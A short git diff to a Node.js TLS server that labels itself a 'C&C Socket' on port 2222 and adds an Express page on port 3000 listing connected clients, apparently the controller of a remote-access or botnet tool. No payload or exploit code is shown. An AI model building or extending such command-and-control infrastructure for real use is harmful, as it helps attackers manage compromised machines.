@@ -1,8 +1,15 @@
-const chalk = require('chalk')
+// Core modules
 const tls = require('tls')
 var fs = require('fs')
 var path = require('path');
-const prompt = require('./utils/prompt')
+
+// npm modules
+const chalk = require('chalk')
+const express = require('express')
+
+// custom modules
+const prompt = require('./utils/prompt');
+const { allowedNodeEnvironmentFlags } = require('process');
 
 /**
  * options object stores the private key and public cert to be used by tls socket for traffic encryption.
@@ -47,11 +54,32 @@ var server = tls.createServer(options, (client) => {
     })
 })
 
+// Express app
+const app = express()
+
+// Default express route that displays all connected clients on the home page
+app.get('', (req, res) => {
+    let clientList = ''
+    
+    Object.keys(clients).forEach((key) => {
+        clientList += key + '<br>'
+    })
+
+    res.send(clientList)
+})
+
 /**
  * listen to incoming tls socket connections and pass by reference to utils/prompt function
  */
 server.listen(2222, () => {
-    console.log('Server is listening')
+    console.log('C&C Socket is live on port 2222')
 
     prompt(clients)
+})
+
+/**
+ * listen to http server on port 3000
+ */
+app.listen(3000, () => {
+    console.log('Webserver is live on port 3000')
 })
